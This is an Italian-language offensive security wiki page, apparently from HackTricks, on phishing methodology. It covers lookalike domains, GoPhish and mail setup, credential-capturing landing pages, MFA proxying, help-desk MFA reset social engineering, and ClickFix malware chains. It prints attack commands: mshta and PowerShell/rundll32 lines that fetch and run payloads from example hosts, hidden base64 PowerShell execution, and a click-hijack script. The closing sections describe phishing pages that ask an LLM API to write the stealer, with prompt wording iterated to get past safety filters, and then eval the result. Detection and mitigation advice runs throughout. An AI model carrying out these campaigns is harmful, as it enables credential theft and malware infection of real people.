# Metodologia di Phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Eseguire la ricognizione della vittima
1. Selezionare il **dominio della vittima**.
2. Eseguire una web enumeration di base **cercando i portali di login** utilizzati dalla vittima e **decidere** quale si intende **impersonare**.
3. Utilizzare l'**OSINT** per **trovare gli indirizzi email**.
2. Preparare l'ambiente
1. **Acquistare il dominio** che si intende utilizzare per il phishing assessment
2. **Configurare i record correlati al servizio email** (SPF, DMARC, DKIM, rDNS)
3. Configurare il VPS con **gophish**
3. Preparare la campagna
1. Preparare il **template email**
2. Preparare la **pagina web** per sottrarre le credenziali
4. Lanciare la campagna!

## Generare nomi di dominio simili o acquistare un dominio affidabile

### Tecniche di variazione dei nomi di dominio

- **Keyword**: Il nome di dominio **contiene una **keyword** importante** del dominio originale (ad es., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Sottodominio con trattino**: Cambiare il **punto con un trattino** di un sottodominio (ad es., www-zelster.com).
- **Nuovo TLD**: Lo stesso dominio utilizzando un **nuovo TLD** (ad es., zelster.org)
- **Homoglyph**: **Sostituisce** una lettera nel nome di dominio con **lettere dall'aspetto simile** (ad es., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Trasposizione:** **Scambia due lettere** all'interno del nome di dominio (ad es., zelsetr.com).
- **Singolarizzazione/Pluralizzazione**: Aggiunge o rimuove una “s” alla fine del nome di dominio (ad es., zeltsers.com).
- **Omissione**: **Rimuove una** delle lettere dal nome di dominio (ad es., zelser.com).
- **Ripetizione:** **Ripete una** delle lettere nel nome di dominio (ad es., zeltsser.com).
- **Sostituzione**: Come homoglyph, ma meno stealthy. Sostituisce una delle lettere nel nome di dominio, eventualmente con una lettera vicina a quella originale sulla tastiera (ad es., zektser.com).
- **Sottodominio**: Inserisce un **punto** all'interno del nome di dominio (ad es., ze.lster.com).
- **Inserimento**: **Inserisce una lettera** nel nome di dominio (ad es., zerltser.com).
- **Punto mancante**: Aggiunge il TLD al nome di dominio (ad es., zelstercom.com)

**Strumenti automatici**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Siti web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Esiste la **possibilità che alcuni bit memorizzati o in fase di comunicazione possano essere modificati automaticamente** a causa di diversi fattori, come brillamenti solari, raggi cosmici o errori hardware.

Quando questo concetto viene **applicato alle richieste DNS**, è possibile che il **dominio ricevuto dal server DNS** non sia lo stesso dominio richiesto inizialmente.

Ad esempio, una modifica di un singolo bit nel dominio "windows.com" può trasformarlo in "windnws.com."

Gli attaccanti possono **sfruttare questa situazione registrando più domini bit-flipping** simili al dominio della vittima. Il loro obiettivo è reindirizzare gli utenti legittimi verso la propria infrastruttura.

Per ulteriori informazioni, leggere [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)<sup>[[9]](#references)</sup>

### Acquistare un dominio affidabile

È possibile cercare su [https://www.expireddomains.net/](https://www.expireddomains.net) un dominio scaduto da utilizzare.\
Per assicurarsi che il dominio scaduto che si intende acquistare **abbia già un buon SEO**, è possibile verificare come viene classificato su:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Scoprire gli indirizzi email

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratuito)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratuito)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Per **scoprire più** indirizzi email validi o **verificare quelli** già individuati, è possibile controllare se si riesce a eseguire il brute-force sui server SMTP della vittima. [Scopri qui come verificare/scoprire un indirizzo email](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Inoltre, non dimenticare che, se gli utenti utilizzano **un portale web per accedere alle proprie email**, è possibile verificare se sia vulnerabile al **username brute force** e sfruttare la vulnerabilità, se possibile.

## Configurazione di GoPhish

### Installazione

È possibile scaricarlo da [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Scaricarlo e decomprimerlo all'interno di `/opt/gophish`, quindi eseguire `/opt/gophish/gophish`\
Nell'output verrà fornita una password per l'utente admin sulla porta 3333. Pertanto, accedere a quella porta e utilizzare tali credenziali per modificare la password admin. Potrebbe essere necessario creare un tunnel verso la porta locale:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configurazione

**Configurazione del certificato TLS**

Prima di questo passaggio dovresti **aver già acquistato il dominio** che utilizzerai e questo deve **puntare** all'**IP del VPS** in cui stai configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configurazione della posta**

Inizia l'installazione: `apt-get install postfix`

Quindi aggiungi il dominio ai seguenti file:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifica anche i valori delle seguenti variabili all'interno di /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Infine modifica i file **`/etc/hostname`** e **`/etc/mailname`** inserendo il nome del tuo dominio e **riavvia il tuo VPS.**

Ora crea un **record DNS A** per `mail.<domain>` che punti all'**indirizzo IP** del VPS e un **record DNS MX** che punti a `mail.<domain>`

Ora proviamo a inviare un'email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configurazione di Gophish**

Arresta l'esecuzione di gophish e configuriamolo.\
Modifica `/opt/gophish/config.json` come segue (nota l'uso di https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configura il servizio gophish**

Per creare il servizio gophish, in modo che possa essere avviato automaticamente e gestito come un servizio, puoi creare il file `/etc/init.d/gophish` con il seguente contenuto:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Completa la configurazione del servizio e verifica il suo funzionamento eseguendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurazione del mail server e del dominio

### Aspetta e sii legittimo

Più un dominio è vecchio, meno è probabile che venga rilevato come spam. Dovresti quindi aspettare il più a lungo possibile (almeno 1 settimana) prima del phishing assessment. Inoltre, se inserisci una pagina relativa a un settore con una buona reputazione, la reputazione ottenuta sarà migliore.

Nota che, anche se devi aspettare una settimana, puoi terminare ora tutta la configurazione.

### Configura il record Reverse DNS (rDNS)

Imposta un record rDNS (PTR) che risolva l'indirizzo IP del VPS nel nome di dominio.

### Record Sender Policy Framework (SPF)

Devi **configurare un record SPF per il nuovo dominio**. Se non sai cosa sia un record SPF, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puoi usare [https://www.spfwizard.net/](https://www.spfwizard.net) per generare la tua policy SPF (usa l'IP della macchina VPS)

![Modulo SPF Wizard per generare un record SPF per un dominio di phishing](<../../images/image (1037).png>)

Questo è il contenuto che deve essere impostato all'interno di un record TXT nel dominio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Record Domain-based Message Authentication, Reporting & Conformance (DMARC)

Devi **configurare un record DMARC per il nuovo dominio**. Se non sai cos'è un record DMARC [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Devi creare un nuovo record DNS TXT che punti all'hostname `_dmarc.<domain>` con il seguente contenuto:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Devi **configurare un DKIM per il nuovo dominio**. Se non sai cos'è un record DMARC, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Questo tutorial si basa su: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)<sup>[[4]](#references)</sup>

> [!TIP]
> Devi concatenare entrambi i valori B64 generati dalla chiave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Verifica il punteggio della configurazione email

Puoi farlo usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Accedi semplicemente alla pagina e invia un'email all'indirizzo che ti forniscono:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Puoi anche **controllare la configurazione della tua email** inviando un'email a `check-auth@verifier.port25.com` e **leggendo la risposta** (per farlo dovrai **aprire** la porta **25** e visualizzare la risposta nel file _/var/mail/root_ se invii l'email come root).\
Verifica di superare tutti i test:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Potresti anche inviare **un messaggio a un Gmail sotto il tuo controllo** e controllare le **intestazioni dell'email** nella posta in arrivo di Gmail; `dkim=pass` dovrebbe essere presente nel campo dell'intestazione `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Rimozione dalla blacklist di Spamhouse

La pagina [www.mail-tester.com](https://www.mail-tester.com) può indicarti se il tuo dominio è bloccato da Spamhouse. Puoi richiedere la rimozione del tuo dominio/IP all'indirizzo: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Rimozione dalla blacklist di Microsoft

​​Puoi richiedere la rimozione del tuo dominio/IP all'indirizzo [https://sender.office.com/](https://sender.office.com).

## Creazione e avvio di una campagna GoPhish

### Profilo di invio

- Imposta un **nome per identificare** il profilo del mittente
- Decidi da quale account invierai le email di phishing. Suggerimenti: _noreply, support, servicedesk, salesforce..._
- Puoi lasciare vuoti nome utente e password, ma assicurati di selezionare Ignora errori del certificato

![Creazione e avvio di una campagna GoPhish - Profilo di invio: puoi lasciare vuoti nome utente e password, ma assicurati di selezionare Ignora errori del certificato](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> È consigliato utilizzare la funzionalità "**Invia email di test**" per verificare che tutto funzioni.\
> Consiglio di **inviare le email di test a indirizzi email temporanei 10min** per evitare di essere inseriti nella blacklist durante i test.

### Modello email

- Imposta un **nome per identificare** il modello
- Quindi scrivi un **oggetto** (nulla di strano, solo qualcosa che ti aspetteresti di leggere in una normale email)
- Assicurati di aver selezionato "**Aggiungi immagine di tracciamento**"
- Scrivi il **modello dell'email** (puoi utilizzare variabili come nell'esempio seguente):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Nota che **per aumentare la credibilità dell'email**, è consigliato utilizzare una firma presa da un'email del cliente. Suggerimenti:

- Invia un'email a un **indirizzo inesistente** e verifica se la risposta contiene una firma.
- Cerca **email pubbliche** come info@ex.com, press@ex.com o public@ex.com, invia loro un'email e attendi la risposta.
- Prova a contattare un indirizzo email **valido precedentemente individuato** e attendi la risposta.

![Sending Profile - Email Template: Prova a contattare un indirizzo email valido precedentemente individuato e attendi la risposta](<../../images/image (80).png>)

> [!TIP]
> L'Email Template consente anche di **allegare file da inviare**. Se vuoi anche sottrarre NTLM challenge utilizzando file/documenti appositamente creati [leggi questa pagina](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Imposta un **nome**
- **Scrivi il codice HTML** della pagina web. Nota che puoi **importare** pagine web.
- Seleziona **Capture Submitted Data** e **Capture Passwords**
- Imposta un **reindirizzamento**

![Email Template - Landing Page: seleziona Capture Submitted Data e Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Di solito dovrai modificare il codice HTML della pagina ed effettuare alcuni test in locale (magari utilizzando un server Apache) **finché non sarai soddisfatto del risultato.** Quindi, inserisci quel codice HTML nel campo.\
> Nota che, se devi **utilizzare risorse statiche** per l'HTML (ad esempio pagine CSS e JS), puoi salvarle in _**/opt/gophish/static/endpoint**_ e accedervi da _**/static/\<filename>**_

> [!TIP]
> Per il reindirizzamento puoi **reindirizzare gli utenti alla pagina web principale legittima** della vittima oppure, ad esempio, reindirizzarli a _/static/migration.html_, inserire una **rotellina di caricamento (**[**https://loading.io/**](https://loading.io)**) per 5 secondi e poi indicare che il processo è stato completato con successo**.

### Users & Groups

- Imposta un nome
- **Importa i dati** (nota che, per utilizzare il template dell'esempio, ti servono nome, cognome e indirizzo email di ogni utente)

![Landing Page - Users & Groups: importa i dati (nota che, per utilizzare il template dell'esempio, ti servono nome, cognome e indirizzo email di ogni utente)](<../../images/image (163).png>)

### Campaign

Infine, crea una campagna selezionando un nome, l'email template, la landing page, l'URL, il sending profile e il gruppo. Nota che l'URL sarà il link inviato alle vittime.

Nota che il **Sending Profile consente di inviare un'email di test per verificare come apparirà l'email di phishing finale**:

![Users & Groups - Campaign: nota che il Sending Profile consente di inviare un'email di test per verificare come apparirà l'email di phishing finale](<../../images/image (192).png>)

> [!TIP]
> Consiglierei di **inviare le email di test a indirizzi email temporanei di 10 minuti** per evitare di essere inseriti nelle blacklist durante i test.

Quando tutto è pronto, avvia la campagna!

## Website Cloning

Se per qualsiasi motivo vuoi clonare il sito web, consulta la pagina seguente:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In alcune valutazioni di phishing (principalmente per i Red Team) potresti voler anche **inviare file contenenti una sorta di backdoor** (magari un C2 o semplicemente qualcosa che attivi un'autenticazione).\
Consulta la pagina seguente per alcuni esempi:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

L'attacco precedente è piuttosto ingegnoso, poiché simuli un sito web reale e raccogli le informazioni inserite dall'utente. Sfortunatamente, se l'utente non ha inserito la password corretta o se l'applicazione che hai simulato è configurata con la 2FA, **queste informazioni non ti permetteranno di impersonare l'utente ingannato**.

È qui che strumenti come [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena) sono utili. Questo strumento consente di generare un attacco simile a un MitM. In pratica, l'attacco funziona nel modo seguente:

1. **Impersoni il modulo di login** della pagina web reale.
2. L'utente **invia** le proprie **credenziali** alla tua pagina falsa e lo strumento le invia alla pagina web reale, **verificando se le credenziali funzionano**.
3. Se l'account è configurato con la **2FA**, la pagina MitM la richiederà e, una volta che l'**utente la inserisce**, lo strumento la invierà alla pagina web reale.
4. Una volta autenticato l'utente, tu (in qualità di attaccante) avrai **catturato le credenziali, la 2FA, il cookie e qualsiasi informazione** relativa a ogni interazione effettuata mentre lo strumento esegue un MitM.

### Via VNC

E se, invece di **inviare la vittima a una pagina malevola** con lo stesso aspetto di quella originale, la inviassi a una **sessione VNC con un browser connesso alla pagina web reale**? Potresti vedere ciò che fa, sottrarre la password, l'MFA utilizzata, i cookie...\
Puoi farlo con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)<sup>[[3]](#references)</sup>

## Detecting the detection

Ovviamente, uno dei modi migliori per sapere se sei stato scoperto è **cercare il tuo dominio nelle blacklist**. Se compare nell'elenco, significa che in qualche modo il tuo dominio è stato rilevato come sospetto.\
Un modo semplice per verificare se il tuo dominio compare in una blacklist consiste nell'utilizzare [https://malwareworld.com/](https://malwareworld.com)

Tuttavia, esistono altri modi per capire se la vittima sta **cercando attivamente attività di phishing sospette in rete**, come spiegato in:


{{#ref}}
detecting-phising.md
{{#endref}}

Puoi **acquistare un dominio con un nome molto simile** a quello del dominio della vittima **e/o generare un certificato** per un **sottodominio** di un dominio sotto il tuo controllo, che **contenga** la **keyword** del dominio della vittima. Se la **vittima** esegue qualsiasi tipo di interazione **DNS o HTTP** con essi, saprai che **sta cercando attivamente** domini sospetti e dovrai essere molto furtivo.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Utilizza [**Phishious** ](https://github.com/Rices/Phishious)per valutare se la tua email finirà nella cartella spam, verrà bloccata oppure avrà successo.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

I modern intrusion set evitano sempre più spesso del tutto gli schemi basati sulle email e **mirano direttamente al workflow del service desk / del recupero dell'identità** per aggirare la MFA. L'attacco è completamente "living-off-the-land": una volta ottenute credenziali valide, l'operatore si sposta utilizzando strumenti di amministrazione integrati: non è richiesto alcun malware.<sup>[[5]](#references)</sup>

### Attack flow
1. Esegui la ricognizione sulla vittima
* Raccogli dettagli personali e aziendali da LinkedIn, data breach, GitHub pubblico, ecc.
* Identifica le identità di alto valore (dirigenti, IT, finanza) e individua l'**esatto processo dell'help desk** per il reset della password / MFA.
2. Social engineering in tempo reale
* Chiama, contatta tramite Teams o chatta con l'help desk impersonando il bersaglio (spesso con **caller ID falsificato** o **voce clonata**).
* Fornisci i dati personali precedentemente raccolti per superare la verifica basata sulla conoscenza.
* Convinci l'operatore a **reimpostare il secret MFA** o a eseguire uno **SIM-swap** su un numero di cellulare registrato.
3. Azioni immediate successive all'accesso (≤60 min nei casi reali)
* Stabilisci un punto d'appoggio tramite un portale web SSO qualsiasi.
* Enumera AD / AzureAD con strumenti integrati (senza depositare binari):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Esegui il movimento laterale con **WMI**, **PsExec** o agenti **RMM** legittimi già autorizzati nell'ambiente.

### Detection & Mitigation
* Tratta il recupero dell'identità tramite help desk come un'**operazione privilegiata**: richiedi un'autenticazione step-up e l'approvazione del responsabile.
* Implementa regole **Identity Threat Detection & Response (ITDR)** / **UEBA** che generino un avviso per:
* Modifica del metodo MFA + autenticazione da un nuovo dispositivo / area geografica.
* Immediata elevazione dello stesso principal (user-→-admin).
* Registra le chiamate all'help desk e applica una **richiamata a un numero già registrato** prima di qualsiasi reset.
* Implementa **Just-In-Time (JIT) / Privileged Access**, in modo che gli account appena reimpostati non ereditino automaticamente token con privilegi elevati.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
I gruppi criminali comuni compensano il costo delle operazioni ad alto contatto con attacchi di massa che trasformano **i motori di ricerca e le reti pubblicitarie nel canale di distribuzione**.<sup>[[5]](#references)</sup>

1. **SEO poisoning / malvertising** spinge un risultato falso come `chromium-update[.]site` in cima agli annunci di ricerca.
2. La vittima scarica un piccolo **first-stage loader** (spesso JS/HTA/ISO). Esempi osservati da Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Il loader esfiltra cookie del browser e database delle credenziali, quindi scarica un **silent loader** che decide, *in realtime*, se distribuire:
* RAT (ad esempio AsyncRAT, RustDesk)
* ransomware / wiper
* componente di persistenza (chiave Run del registro + attività pianificata)

### Hardening tips
* Blocca i domini registrati di recente e applica **Advanced DNS / URL Filtering** anche agli *search ads*, oltre che alle email.
* Limita l'installazione del software a pacchetti MSI / Store firmati; nega l'esecuzione di `HTA`, `ISO`, `VBS` tramite policy.
* Monitora i processi figli dei browser che aprono installer:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Cerca i LOLBins frequentemente abusati dai first-stage loader (ad esempio `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Alcuni portali di software falsi mantengono l'`href` di download visibile che punta all'URL **reale** di GitHub/release, ma dirottano la **prima** interazione dell'utente tramite JavaScript e inviano invece la vittima a una catena di **Traffic Distribution System (TDS)**.<sup>[[8]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Tratti chiave:
- L’hook viene solitamente eseguito nella **capture phase** (`true`) su `document`, quindi viene attivato prima degli handler del sito.
- Chrome usa spesso `mousedown` invece di `click` per mantenere il redirect associato a un **user gesture** valido e migliorare l’elusione dei popup blocker.
- Alcune varianti aprono in anticipo `about:blank` o simulano click su `<a target="_blank">`, assegnando l’URL del TDS solo in seguito.
- I limiti lato browser si trovano comunemente in `localStorage`, quindi il **primo click** può raggiungere il malware, mentre refresh e nuovi tentativi ricadono sul link visibile dall’aspetto innocuo.
- Il TDS può filtrare in base a referrer, dominio di ingresso, GEO, fingerprint del browser/dispositivo, controlli VPN/datacenter, contesto del click e contatori per sessione, rendendo non deterministici i replay degli analisti.

Idee per i defender:
- Confrontare l’`href` **visualizzato** con il target di navigazione **effettivo** generato al momento del click.
- Cercare handler `document.addEventListener(..., true)` che chiamano sia `preventDefault()` sia `stopImmediatePropagation()` insieme a `window.open`, `about:blank` o click simulati su anchor.
- Considerare come pattern ad alto segnale di SEO poisoning/TDS i gruppi di domini appena registrati per il download di software che caricano tutti lo stesso stage CloudFront/JS.

### ClickFix da fake verification pages + fetch di LOLBAS dall’aspetto di archivi
Alcuni rami del TDS terminano in una fake verification page (in stile Cloudflare/IUAM) che indica alla vittima di eseguire un trusted Windows binary come:<sup>[[8]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Note:
- `mshta.exe` esegue **HTA/VBScript all'inizio della risposta**, anche se l'URL finge di essere un archivio `.7z`; i dati dell'archivio aggiunti possono essere puro depistaggio.
- Gli stage successivi spesso continuano a mentire sul tipo di file (`.rtf` per PowerShell, `.asar` per Python, ZIP con binari riempiti) e poi passano al **PE mapping manuale / all'esecuzione in memoria**.
- Se stai rispondendo a una di queste catene, conserva **rete + memoria dalla prima esecuzione riuscita**: i replay successivi potrebbero mostrare solo un percorso benigno dell'installer/SFX o fallire perché il rilascio del payload/chiave era associato alla sessione TDS originale.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Esca: advisory CERT nazionale clonato con un pulsante **Update** che mostra istruzioni dettagliate per la “correzione”. Alle vittime viene detto di eseguire un batch che scarica una DLL e la esegue tramite `rundll32`.<sup>[[8]](#references)</sup>
* Catena batch tipica osservata:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` deposita il payload in `%TEMP%`, una breve pausa nasconde il jitter di rete, quindi `rundll32` chiama l'entrypoint esportato (`notepad`).
* La DLL invia l'identità dell'host e interroga il C2 ogni pochi minuti. I task remoti arrivano come **PowerShell codificato in base64**, eseguito in modalità nascosta e con bypass delle policy:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Questo mantiene la flessibilità del C2 (il server può sostituire i task senza aggiornare la DLL) e nasconde le finestre della console. Cerca processi PowerShell figli di `rundll32.exe` che utilizzano insieme `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* I difensori possono cercare callback HTTP(S) nella forma `...page.php?tynor=<COMPUTER>sss<USER>` e intervalli di polling di 5 minuti dopo il caricamento della DLL.

---

## Operazioni di Phishing potenziate dall'AI
Gli attaccanti ora concatenano **API LLM e di clonazione vocale** per esche completamente personalizzate e interazioni in tempo reale.

| Layer | Esempio di utilizzo da parte della threat actor |
|-------|---------------------------------------------|
|Automation|Generare e inviare >100 k email / SMS con formulazioni randomizzate e link di tracking.|
|Generative AI|Produrre email *one-off* che fanno riferimento a operazioni M&A pubbliche e battute interne tratte dai social media; voce deep-fake del CEO in una truffa tramite callback.|
|Agentic AI|Registrare autonomamente domini, raccogliere informazioni da fonti open-source e creare email dello stage successivo quando una vittima fa clic ma non invia le credenziali.|

**Difesa:**
• Aggiungi **banner dinamici** che evidenzino i messaggi inviati da sistemi di automazione non attendibili (tramite anomalie ARC/DKIM).
• Implementa **frasi di verifica voice-biometriche** per le richieste telefoniche ad alto rischio.
• Simula continuamente esche generate dall'AI nei programmi di sensibilizzazione: i template statici sono obsoleti.

Vedi anche - abuso della navigazione agentica per il credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Vedi anche - abuso degli agenti AI degli strumenti CLI locali e di MCP (per l'inventario e il rilevamento dei secrets):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Assemblaggio runtime di JavaScript per il phishing assistito da LLM (codegen nel browser)

Gli attaccanti possono distribuire HTML dall'aspetto benigno e **generare lo stealer a runtime** chiedendo JavaScript a una **trusted LLM API**, quindi eseguirlo nel browser (ad esempio, tramite `eval` o uno `<script>` dinamico).<sup>[[7]](#references)</sup>

1. **Prompt-as-obfuscation:** codificare gli URL di esfiltrazione/le stringhe Base64 nel prompt; iterare la formulazione per aggirare i filtri di sicurezza e ridurre le allucinazioni.
2. **Client-side API call:** al caricamento, JS chiama un LLM pubblico (Gemini/DeepSeek/ecc.) o un proxy CDN; nell'HTML statico sono presenti solo il prompt e la chiamata API.
3. **Assemble & exec:** concatenare la risposta ed eseguirla (polimorfa a ogni visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/esfiltrazione:** il codice generato personalizza l'esca (ad esempio il parsing dei token LogoKit) e invia le credenziali all'endpoint nascosto nel prompt.

**Caratteristiche di evasione**
- Il traffico raggiunge domini LLM noti o proxy CDN affidabili; talvolta passa tramite WebSockets verso un backend.
- Nessun payload statico; il JS malevolo esiste solo dopo il rendering.
- Le generazioni non deterministiche producono **stealer unici** per ogni sessione.

**Idee per il rilevamento**
- Eseguire sandbox con JS abilitato; segnalare la **creazione dinamica di script/`eval` a runtime alimentata da risposte LLM**.
- Cercare POST del front-end verso API LLM seguiti immediatamente da `eval`/`Function` sul testo restituito.
- Generare un alert per i domini LLM non autorizzati nel traffico client, seguiti da POST di credenziali.

---

## Variante MFA Fatigue / Push Bombing – Reset forzato
